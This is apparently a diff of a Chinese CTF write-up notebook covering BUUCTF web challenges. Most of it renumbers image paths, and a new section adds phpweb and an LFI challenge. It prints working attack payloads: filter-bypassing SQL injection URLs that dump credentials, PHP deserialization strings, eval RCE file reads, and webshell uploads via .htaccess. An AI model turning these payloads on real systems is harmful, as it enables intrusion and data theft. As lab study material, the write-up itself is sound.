@@ -58,57 +58,57 @@ description: 记录蛤
 
 ## （2）\[ACTF2020 新生赛]Upload 1
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 点击那个灯泡就有了文件上传，应该还是文件上传漏洞。随便上传一张图片。
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 我们可以发现上传的文件的路径是在/uplo4d/下面。我们还是尝试抓包。
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后改包上传我们的木马语句，然后发现识别出来是bad file，我们在文件前面加图片头试试。
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 发现加了文件头还是失败，后面我们修改了文件后缀，我们直接用的phtml，不知道为什么也就他可以，然后结果就发现出来了。上传成功了。
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后去到那个文件下面，发现成功了。
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 直接连接antsword了，毕竟这上面的题目的路径都很复杂。
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## (3)\[极客大挑战 2019]BabySQL 1
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 感觉这个应该有一些过滤或者什么的。随便试试一个闭合
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后发现or没了，所以怀疑一些关键词or and这种都被过滤了。后面还发现，order by因为前面有or，也被过滤了啦，太离谱了有点。后面发现union，select这种全部被过滤了。
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 对于过滤的方式，我们采用双写的方式绕过这个过滤。然后联合查询看看到底有几列。
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 其实这种一般也就3，4列，结果3刚好就试出来了。并且他的回显我们看到，他是hello后面显示第二列的，密码显示第三列的，其实第二和第三都有回显，那么我们可以在这里做一些文章了。
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 首先查询数据库名了。
 
@@ -116,7 +116,7 @@ description: 记录蛤
 http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,database(),3+%23
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 好好数据库名为geek，查看表名，这里有个坑就是or被过滤了，需要双写，你说好不好玩。
 
@@ -124,7 +124,7 @@ http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username
 http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(table_name),3+frfromom infoorrmation_schema.tables whwhereere table_schema='geek'+%23
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 这里有两张表，b4bsql,geekuser。我猜是这个geekuser有信息哦。查查列名吧。
 
@@ -132,7 +132,7 @@ http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username
 http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(column_name),3+frfromom infoorrmation_schema.columns whwhereere table_name='geekuser'+%23
 ```
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 很明显，是这个，三个列，username，id，password，三个。直接看吧。password别忘了双写，真的荒谬。
 
@@ -140,7 +140,7 @@ http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username
 http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username=admin&password=admin%27+uunionnion+selselectect+1,group_concat(passwoorrd),3+frfromom geek.geekuser+%23
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 阿哲，其实这个时候竟然不是，我人傻了，难道是错了一个表应该。是另外一个表。我服了。
 
@@ -150,7 +150,7 @@ http://a21dc942-8a66-4a7d-bd94-c355dfbad89e.node5.buuoj.cn:81/check.php?username
 
 果然flag在这里。
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Syclover @ cl4y
 
@@ -178,23 +178,23 @@ dirsearch -u http://430242be-4302-48a1-9751-df8ccc88bec4.node5.buuoj.cn:81/ -e p
 
 然后因为实在是太多了，光是php就有8000多，所以我们直接看wp说有www.zip这个文件，其实感觉有点难判断怎么是www.zip文件的。
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 可以看到这个里面有一个flag.php文件
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 打开发现里面好像不是我们要找的flag。
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 这里还有一个class.php,然后打开发现是类之类的，猜测是反序列化漏洞。
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 还要配合index.php里面确定是反序列化漏洞
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 其实很明显就是如果要显示flag的话是要求username为admin，password为100的，并且\_\_wakeup（）函数不能执行，因为在反序列化的时候会执行这个函数，如果要绕过wakeup的话，我们需要属性数变大就能绕过这个函数。然后我们写一个php脚本来序列化我们的结果。
 
@@ -235,7 +235,7 @@ O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:
 
 这样才能得到flag。
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -243,45 +243,45 @@ O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:
 
 
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 其实他的提示也是找到源文件。
 
 刚刚用过一个dirsearch，这一次也来试试。
 
-<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 有index.php.bak，这个备份文件，我们在常用后缀里面有介绍过它的存在。
 
-<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 查看这个文件发现
 
-<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 感觉这个考的是php特性的弱比较，所以我们直接传入$key是个数字并且为123就可以了。
 
 得到flag。
 
-<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## （6）\[RoarCTF 2019]Easy Calc 1
 
-<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 就是一个简单的计算器，不知道随便试试，不知道考啥现在还。
 
 查看源码发现写了一句设置了waf去确保安全
 
-<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 发现有一个calc.php进行计算的，我们去查看这个文件。直接看到源码了，也发现了过滤规则
 
-<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 这里有一个函数eval（）代码执行函数，这个主要是考察RCE漏洞啊，但是他过滤了很多单引号，双引号，dollar之类的全部过滤了，只有用无参数的读取文件了。这里可以参考 [#id-6.-wu-can-shu-du-qu](../rce-yuan-cheng-dai-ma-zhi-hang/代码执行知识点总结.md#id-6.-wu-can-shu-du-qu "mention")
 
@@ -293,7 +293,7 @@ O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:
 http://node5.buuoj.cn:29062/calc.php? num=var_dump(scandir(chr(46)))
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后查看根目录下面的文件有哪些。
 
@@ -301,7 +301,7 @@ http://node5.buuoj.cn:29062/calc.php? num=var_dump(scandir(chr(46)))
 http://node5.buuoj.cn:29062/calc.php? num=print_r(scandir(chr(47)))
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 看到有一个flagg，我们应该就是要进入这个目录下面去查看。我发现这个时候用chr和.是最好用的。其实后面尝试后发现这个不是一个目录，是一个文件。
 
@@ -309,13 +309,13 @@ http://node5.buuoj.cn:29062/calc.php? num=print_r(scandir(chr(47)))
 http://node5.buuoj.cn:29062/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## （7）\[BJDCTF2020]Easy MD5
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 这个知识点之前在总结的时候并没有好好总结完，所以这里补充了md5（）函数的绕过的知识点，这个知识点好像是在sql注入里面的。我们补充了这个知识点在sql注入里面。
 
@@ -325,103 +325,103 @@ http://node5.buuoj.cn:29062/calc.php?%20num=file_get_contents(chr(47).chr(102).c
 
 我们可以看到在里面有一个hint，并且是md5（password，true）绕过，所以我们向pass输入ffifdyop
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后跳转到另外一个php文件
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 查看源码我们可以发现他的php代码
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 很明显这是我们php特性里面的==弱比较和md5（）的特性。
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 我们传入里面的随便两个就可以。
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 传入之后跳转到另外一个php文件了，需要post传入的结果不相等，但是md5得完全相等，我们可以通过传入两个数组去绕过。
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## （8）\[极客大挑战 2019]BuyFlag 1
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 刚打开真的不知道要干嘛，然后看到有一个payflag网页，进入然后说得要是cuit的学生，并且要回答正确的密码。
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 查看源码发现有php代码
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 利用的是php弱比较
 
 然后输入以404开头的字符串，比如404abc之类的。这完成了第二个要求，还有一个，判断你是cuit的成员，我们抓个包尝试一下。
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 发现cookie上面有个user=0，应该是user=1就是认为你是cuit的成员。
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后出现了另外的要求，需要很多钱
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 所以我们post传入money和password，并且把user改为1就成了应该。
 
-<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 但是他显示我的钱的数字位数太长了，那我们得换一种表示方式用科学计数法绕过，1后面9个零表示1e9
 
 得到flag。
 
-<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## （9）\[HCTF 2018]admin 1
 
-<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 看不出什么，查看一下源码
 
-<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 提示我了，我不是admin，然后我们注册登录之类的。提示说admin被人注册了，就说明，我们要用admin的账号登录，那么我们知道username=admin，就要知道密码。
 
 应该是弱密码，我随便输入了一个123，就出来了flag，甚至都不需要我爆破，我是欧皇。
 
-<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## （10）\[MRCTF2020]你传你🐎呢 1
 
-<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 应该是个文件上传漏洞。要传一句话木马大概是。
 
 上传了一个一个话木马的jpg文件发现上传成功了。
 
-<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 我们抓个包。
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后发现上传失败了。
 
-<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 后面看到是要上传.htaccess文件，其实在这个时候感觉上传这种文件不知道是怎么判断出来的，但是他既然是这样那我们就传.htaccess文件吧。那我们就写一个让他把png文件可以当错php代码来执行的.htaccess文件
 
@@ -524,27 +524,27 @@ class Flag{  //flag.php
 
 可以看到报错注入的函数没有被过滤，xpath报错还能用，那我们就用他们来进行报错注入。
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后我们首先爆库名发现是geek
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后爆表名，这里需要注意，空格用（）绕过，=用like绕过。
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后爆列名，得到id，username，password，我们当然去看password
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 查看发现password并不完整，也就是说，还有没有显示出来的。我们从右边开始看看
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后拼起来
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到flag。
 
@@ -574,15 +574,15 @@ class Flag{  //flag.php
 
 后面看的差不多了，但是这个ord函数我不太了解，我用手册查查看
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 然后又查了ascii码表
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 这里也粘贴一下p神对这个的理解
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 并且自己也对他进行理解了。并且写这个题对pop链也理解了，就把反序列化的知识点都总结了一下。
 
@@ -600,33 +600,33 @@ echo serialize($a);
 ?>
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 最后得到flag。
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 ## （16）\[GXYCTF2019]BabyUpload 1
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 上传png和jpg都显示上传太露骨了，感觉是前端把一些后缀名过滤了。直接抓包了。上传.htaccss文件了。让他能把php代码执行了。
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后上传php代码了，发现他好像能识别一些php的特征，这里猜测是因为\<?这个符号，我们用\<script>标签来代替吧。
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后用蚁剑连接。
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 得到flag。
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -862,6 +862,213 @@ O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:13:"www.bai
 不知道为什么出来很慢，不知道是因为我没有写对还是啥。半天没出来结果。
 
 ***
+
+## （19）\[网鼎杯 2020 朱雀组]phpweb 1
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+一直在刷新，wtf，这个背景真的一言难尽懂吧。
+
+抓包这个func，应该是要的函数，p是要读的文件。
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+```php
+   <?php
+    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+    function gettime($func, $p) {
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == "string") {
+            return $result;
+        } else {return "";}
+    }
+    class Test {
+        var $p = "Y-m-d h:i:s a";
+        var $func = "date";
+        function __destruct() {
+            if ($this->func != "") {
+                echo gettime($this->func, $this->p);
+            }
+        }
+    }
+    $func = $_REQUEST["func"];
+    $p = $_REQUEST["p"];
+
+    if ($func != null) {
+        $func = strtolower($func);
+        if (!in_array($func,$disable_fun)) {
+            echo gettime($func, $p);
+        }else {
+            die("Hacker...");
+        }
+    }
+    ?>
+```
+
+其实发现自己反序列化越来越拉了是为什么太久没看php代码了吗。
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+
+
+***
+
+## （20）\[BSidesCF 2020]Had a bad day 1
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+看到了这个url，但是不是sql注入。emmm，一下子都不知道该从何下手了。
+
+原来是从index.php试出来的，emmm，但是人家是图片名？好吧，试试吧
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+category这个参数接受的被认为是文件名，那么我们就让他去读文件。果然是include函数读文件
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```
+ PGh0bWw+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkltYWdlcyB0aGF0IHNwYXJrIGpveSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWluaW11bS1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhhZCBhIGJhZCBkYXk/PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL21hdGVyaWFsLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJwYWdlLWxheW91dCBtZGwtbGF5b3V0IG1kbC1sYXlvdXQtLWZpeGVkLWhlYWRlciBtZGwtanMtbGF5b3V0IG1kbC1jb2xvci0tZ3JleS0xMDAiPgogICAgICA8aGVhZGVyIGNsYXNzPSJwYWdlLWhlYWRlciBtZGwtbGF5b3V0X19oZWFkZXIgbWRsLWxheW91dF9faGVhZGVyLS1zY3JvbGwgbWRsLWNvbG9yLS1ncmV5LTEwMCBtZGwtY